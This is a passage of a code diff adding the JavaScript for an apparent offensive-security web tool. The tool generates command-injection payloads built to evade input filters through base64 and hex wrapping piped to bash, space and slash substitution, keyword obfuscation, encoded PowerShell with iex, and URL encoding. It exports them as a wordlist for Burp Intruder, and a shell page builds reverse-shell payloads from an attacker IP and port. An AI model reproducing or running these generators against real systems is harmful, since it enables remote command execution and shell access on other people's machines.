+  stratHtml+='<div class="strat"><div class="strat-head"><h4 style="color:var(--green)">\ud83d\udfe2 Strategy A: Base64 Full-Wrap ('+wrappers.length+' payloads)</h4><span class="strat-count">Hides ALL chars inside encoding \u2014 bash<<<$(base64 -d<<<ENCODED)</span></div>';
+  stratHtml+='<div class="strat-body">'+wrappers.map(function(w,i){return '<div class="strat-row"><button class="btn-xs" data-m-idx="'+(G_MASTER.indexOf(w.payload))+'">\ud83d\udccb</button><span class="strat-label">'+escH(w.label)+'</span><span class="strat-payload">'+escH(w.payload)+'</span></div>';}).join('')+'</div></div>';
+
+  // ─── STRATEGY B: HEX FULL-WRAP ───
+  var hexStr='';for(var i=0;i<raw.length;i++)hexStr+=raw.charCodeAt(i).toString(16);
+  var hexPayloads=[];
+  seps.forEach(function(sep){
+    // xxd variant (uses |)
+    if(!isBlk('|')){var p=base+sep.val+'xxd'+(!isBlk(' ')?' ':spOptions[0].val)+'-r'+(!isBlk(' ')?' ':spOptions[0].val)+'-p<<<'+hexStr+'|bash';hexPayloads.push({label:'xxd+'+sep.id,payload:p});G_MASTER.push(p);}
+    // printf variant
+    var hx='';for(var i=0;i<raw.length;i++)hx+='\\x'+raw.charCodeAt(i).toString(16);
+    var p2=base+sep.val+"printf '"+hx+"'|bash";hexPayloads.push({label:'printf_hex+'+sep.id,payload:p2});G_MASTER.push(p2);
+  });
+  if(hexPayloads.length){stratHtml+='<div class="strat"><div class="strat-head"><h4 style="color:var(--blue)">\ud83d\udd35 Strategy B: Hex Full-Wrap ('+hexPayloads.length+')</h4><span class="strat-count">Entire command as hex</span></div>';
+  stratHtml+='<div class="strat-body">'+hexPayloads.map(function(w){return '<div class="strat-row"><button class="btn-xs" data-m-idx="'+G_MASTER.indexOf(w.payload)+'">\ud83d\udccb</button><span class="strat-label">'+escH(w.label)+'</span><span class="strat-payload">'+escH(w.payload)+'</span></div>';}).join('')+'</div></div>';}
+
+  // ─── STRATEGY C: DIRECT CHAR-BY-CHAR BYPASS ───
+  var directPayloads=[];
+  var safeSpaces=spaces.length?spaces:filterCtx(SPACE_BYPASSES).filter(techOk).slice(0,4);
+  var safeSlashes=slashes.length?slashes:filterCtx(SLASH_BYPASSES).filter(techOk).slice(0,3);
+  if(!safeSpaces.length)safeSpaces=[{id:'%09',val:'%09'}];
+  if(!safeSlashes.length)safeSlashes=[{id:'%2f',val:'%2f'}];
+  seps.forEach(function(sep){safeSpaces.forEach(function(sp){safeSlashes.forEach(function(sl){
+    var cmd=raw;
+    if(sp.special==='brace_expansion'){cmd='{'+cmd.split(/\s+/).join(',')+'}';} else {cmd=cmd.replace(/ /g,sp.val);}
+    if(sl.id!=='literal')cmd=cmd.replace(/\//g,sl.val);
+    // Replace pipes with workarounds if blocked
+    if(isBlk('|')&&cmd.indexOf('|')>=0){
+      // Can't do direct char bypass for pipes — skip this combo
+      return;
+    }
+    var full=sep.inline?(sep.id==='backtick'?base+'`'+cmd+'`':base+'$('+cmd+')'):base+sep.val+cmd;
+    directPayloads.push({label:sep.id+'+'+sp.id+'+'+sl.id,payload:full});G_MASTER.push(full);
+  });});});
+  if(directPayloads.length){stratHtml+='<div class="strat"><div class="strat-head"><h4 style="color:var(--amber)">\ud83d\udfe1 Strategy C: Direct Char Bypass ('+directPayloads.length+')</h4><span class="strat-count">Replace spaces/slashes with confirmed bypasses</span></div>';
+  stratHtml+='<div class="strat-body">'+directPayloads.map(function(w){return '<div class="strat-row"><button class="btn-xs" data-m-idx="'+G_MASTER.indexOf(w.payload)+'">\ud83d\udccb</button><span class="strat-label">'+escH(w.label)+'</span><span class="strat-payload">'+escH(w.payload)+'</span></div>';}).join('')+'</div></div>';}
+
+  // ─── STRATEGY D: KEYWORD OBFUSCATION + CHAR BYPASS ───
+  var kwPayloads=[];
+  var firstWord=raw.split(/\s+/)[0];
+  var obfIds=['quote_single','quote_double','dollar_at','backslash_mid','rev_cmd','env_exec','setsid','timeout','nice'];
+  seps.forEach(function(sep){
+    obfIds.forEach(function(oid){
+      var tech=KEYWORD_OBFUSCATION.find(function(t){return t.id===oid;});
+      if(!tech||!techOk(tech))return;
+      var obfCmd=smartObf(raw,oid);if(!obfCmd)return;
+      // Apply space + slash bypass
+      var sp=safeSpaces[0];
+      if(sp.special==='brace_expansion'){obfCmd='{'+obfCmd.split(/\s+/).join(',')+'}';} else if(sp.id!=='literal'){obfCmd=obfCmd.replace(/ /g,sp.val);}
+      var sl=safeSlashes[0];if(sl.id!=='literal')obfCmd=obfCmd.replace(/\//g,sl.val);
+      if(isBlk('|')&&obfCmd.indexOf('|')>=0)return;
+      var full=base+sep.val+obfCmd;
+      kwPayloads.push({label:oid+'+'+sep.id,payload:full});G_MASTER.push(full);
+    });
+  });
+  if(kwPayloads.length){stratHtml+='<div class="strat"><div class="strat-head"><h4 style="color:var(--purple)">\ud83d\udfe3 Strategy D: Keyword Obfuscation ('+kwPayloads.length+')</h4><span class="strat-count">Disguise command name + apply char bypasses</span></div>';
+  stratHtml+='<div class="strat-body">'+kwPayloads.map(function(w){return '<div class="strat-row"><button class="btn-xs" data-m-idx="'+G_MASTER.indexOf(w.payload)+'">\ud83d\udccb</button><span class="strat-label">'+escH(w.label)+'</span><span class="strat-payload">'+escH(w.payload)+'</span></div>';}).join('')+'</div></div>';}
+
+  // ─── STRATEGY E: POWERSHELL (Windows) ───
+  if(document.getElementById('cfg-os').value==='windows'||document.getElementById('cfg-os').value==='powershell'){
+    var psPayloads=[];
+    // PowerShell base64 encode (UTF-16LE)
+    var utf16='';for(var i=0;i<raw.length;i++){utf16+=String.fromCharCode(raw.charCodeAt(i));utf16+=String.fromCharCode(0);}
+    var psB64=safeB64(utf16);
+    seps.forEach(function(sep){
+      var p1=base+sep.val+'powershell -e '+psB64;psPayloads.push({label:'ps_b64+'+sep.id,payload:p1});G_MASTER.push(p1);
+      var p2=base+sep.val+'powershell -enc '+psB64;psPayloads.push({label:'ps_enc+'+sep.id,payload:p2});G_MASTER.push(p2);
+      var p3=base+sep.val+'iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\''+psB64+'\')))"';psPayloads.push({label:'ps_iex+'+sep.id,payload:p3});G_MASTER.push(p3);
+    });
+    stratHtml+='<div class="strat"><div class="strat-head"><h4 style="color:var(--cyan)">\ud83d\udfe6 Strategy E: PowerShell Encoded ('+psPayloads.length+')</h4></div>';
+    stratHtml+='<div class="strat-body">'+psPayloads.map(function(w){return '<div class="strat-row"><button class="btn-xs" data-m-idx="'+G_MASTER.indexOf(w.payload)+'">\ud83d\udccb</button><span class="strat-label">'+escH(w.label)+'</span><span class="strat-payload">'+escH(w.payload)+'</span></div>';}).join('')+'</div></div>';
+  }
+
+  // ─── STRATEGY F: URL-ENCODED VARIANTS ───
+  var urlPayloads=[];
+  // Take first payload from each strategy and URL-encode it
+  [wrappers[0],hexPayloads[0],directPayloads[0]].forEach(function(w){
+    if(!w)return;
+    var enc=encodeURIComponent(w.payload.replace(base,''));
+    urlPayloads.push({label:'url:'+w.label,payload:base+enc});G_MASTER.push(base+enc);
+    var dblEnc=encodeURIComponent(enc);
+    urlPayloads.push({label:'dbl_url:'+w.label,payload:base+dblEnc});G_MASTER.push(base+dblEnc);
+  });
+  if(urlPayloads.length){stratHtml+='<div class="strat"><div class="strat-head"><h4 style="color:var(--fg2)">\u26AA Strategy F: Full URL Encoding ('+urlPayloads.length+')</h4></div>';
+  stratHtml+='<div class="strat-body">'+urlPayloads.map(function(w){return '<div class="strat-row"><button class="btn-xs" data-m-idx="'+G_MASTER.indexOf(w.payload)+'">\ud83d\udccb</button><span class="strat-label">'+escH(w.label)+'</span><span class="strat-payload" style="font-size:.66rem">'+escH(w.payload)+'</span></div>';}).join('')+'</div></div>';}
+
+  document.getElementById('solve-strategies').innerHTML=stratHtml;
+
+  // ─── MASTER WORDLIST ───
+  var masterEl=document.getElementById('solve-master');masterEl.style.display='block';
+  masterEl.innerHTML='<div style="background:var(--bg3);border:1px solid var(--green);border-radius:var(--radius);padding:10px;margin-top:8px"><div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px"><h4 style="font-size:.76rem;color:var(--green)">\ud83c\udfaf MASTER WORDLIST: '+G_MASTER.length+' total payloads across '+[wrappers.length?1:0,hexPayloads.length?1:0,directPayloads.length?1:0,kwPayloads.length?1:0,urlPayloads.length?1:0].reduce(function(a,b){return a+b;},0)+' strategies</h4><div style="display:flex;gap:4px;flex-wrap:wrap"><button class="btn btn-s btn-g" onclick="clip(G_MASTER.join(\'\\n\'));toast(G_MASTER.length+\' copied\')">\ud83d\udccb Copy All for Intruder</button><button class="btn btn-s btn-v" onclick="clip(G_MASTER.map(encodeURIComponent).join(\'\\n\'))">\ud83d\udd17 URL-Enc</button><button class="btn btn-s" onclick="dl(\'rubiks_solver_\'+Date.now()+\'.txt\',G_MASTER.join(\'\\n\'))">\u2b07 Download</button></div></div></div>';
+
+  toast(G_MASTER.length+' payloads generated across all strategies');
+}
+
+function smartObf(cmd,tid){var w=cmd.split(/\s+/)[0],args=cmd.split(/\s+/).slice(1).join(' '),suf=args?' '+args:'',m=Math.max(1,Math.floor(w.length/2));switch(tid){
+  case 'quote_single':return w.slice(0,m)+"'"+w.slice(m)+"'"+suf;case 'quote_double':return w.slice(0,m)+'"'+w.slice(m)+'"'+suf;
+  case 'dollar_at':return w.split('').join('$@')+suf;case 'backslash_mid':return w.split('').join('\\')+suf;
+  case 'rev_cmd':return "$(rev<<<'"+w.split('').reverse().join('')+"')"+suf;
+  case 'env_exec':return 'env '+cmd;case 'nice':return 'nice -n 10 '+cmd;case 'timeout':return 'timeout 5 '+cmd;case 'setsid':return 'setsid '+cmd;
+  default:return null;}}
+
+/* ═══════════════════════════════════════════════════════════
+   P5: SHELL
+   ═══════════════════════════════════════════════════════════ */
+function initShell(){document.getElementById('shell-tpl').innerHTML=filterCtx(REVERSE_SHELLS).map(function(s){return '<option value="'+s.id+'">'+s.id+'</option>';}).join('');}
+function genShell(){var ip=document.getElementById('shell-ip').value||'IP',port=document.getElementById('shell-port').value||'4444',shell=REVERSE_SHELLS.find(function(s){return s.id===document.getElementById('shell-tpl').value;});if(!shell)return;var p=shell.val.replace(/IP/g,ip).replace(/PORT/g,port);if(state.workingSpaces.length&&state.workingSpaces[0].id!=='literal')p=p.replace(/ /g,state.workingSpaces[0].val);if(state.workingSlashes.length&&state.workingSlashes[0].id!=='literal')p=p.replace(/\//g,state.workingSlashes[0].val);var sep=state.workingSeps.length?state.workingSeps[0].val:'%0a';var full=B()+sep+p;document.getElementById('shell-out').style.display='';document.getElementById('shell-out').textContent=full;G_P=[full];}
+function cpS(){clip(document.getElementById('shell-out').textContent);}
+function cpSU(){clip(encodeURIComponent(document.getElementById('shell-out').textContent));}
+function cpSB(){clip(safeB64(document.getElementById('shell-out').textContent));}
+
+/* REF */
+function renderRef(){var tabs=document.getElementById('ref-tabs'),body=document.getElementById('ref-body');var dbs=Object.keys(ALL_DBS);if(!tabs.innerHTML)tabs.innerHTML=dbs.map(function(k,i){return '<button class="btn btn-xs'+(i===0?' btn-v':'')+'" onclick="showRef(\''+k+'\',this)">'+k.replace(/_/g,' ')+'</button>';}).join('');showRef(dbs[0]);}
+function showRef(db,btn){if(btn){document.querySelectorAll('#ref-tabs .btn').forEach(function(b){b.classList.remove('btn-v');});btn.classList.add('btn-v');}var ts=ALL_DBS[db];G_P=ts.map(function(t){return t.val;});var h='<div class="fmap-rows" style="max-height:450px">';ts.forEach(function(t,i){h+='<div class="fmap-row'+(techOk(t)?'':' fmap-fail')+'"><button class="btn-xs" data-cp-idx="'+i+'">\ud83d\udccb</button><span class="fmap-tag">'+escH(t.id)+'</span><span class="fmap-pl">'+escH(t.val)+'</span>'+(t.note?'<span style="font-size:.54rem;color:var(--fg3)">'+escH(t.note)+'</span>':'')+'</div>';});h+='</div>';document.getElementById('ref-body').innerHTML=h;}
+
+/* RESET & KEYS */
+function resetAll(){if(!confirm('Reset?'))return;state={charStatus:{},workingSeps:[],workingSpaces:[],workingSlashes:[],workingObfs:[],dimResults:{}};save();renderCharmap();goPage('fingerprint');toast('Reset');}
+document.addEventListener('keydown',function(e){if(e.target.tagName==='INPUT'||e.target.tagName==='SELECT')return;var k=e.key;if(k>='1'&&k<='5')goPage(['fingerprint','profile','discover','solve','shell'][parseInt(k)-1]);});
+document.getElementById('solve-cmd').addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();solveCube();}});
+
+/* INIT */
+qaCheck();renderCharmap();
+</script>
+<button id="theme-toggle-btn" title="Toggle theme (t)">☀</button>
+
+<script>
+(function(){
+  function setTheme(theme) {
+    document.documentElement.setAttribute('data-theme', theme);
+    var btn = document.getElementById('theme-toggle-btn');
+    if (btn) btn.textContent = theme === 'dark' ? '☀' : '🌙';
+    try { localStorage.setItem('mahdiesta-theme', theme); } catch(e) {}
+  }
+  function toggleTheme() {
+    var current = document.documentElement.getAttribute('data-theme') || 'dark';
+    setTheme(current === 'dark' ? 'light' : 'dark');
+  }
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 't' || e.key === 'T') toggleTheme();
+  });
+  var btn = document.getElementById('theme-toggle-btn');
+  if (btn) btn.addEventListener('click', toggleTheme);
+  var saved = 'dark';
+  try { saved = localStorage.getItem('mahdiesta-theme') || 'dark'; } catch(e) {}
+  setTheme(saved);
+})();
+</script>
+
+<footer style="text-align:center;padding:1.5rem;border-top:1px solid var(--mah-border);color:var(--mah-text-secondary);font-size:0.75rem;font-family:'JetBrains Mono',monospace;margin-top:2rem;">
+  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta — Offensive Security Toolkit
+</footer>
+
+</body>
+</html>
+
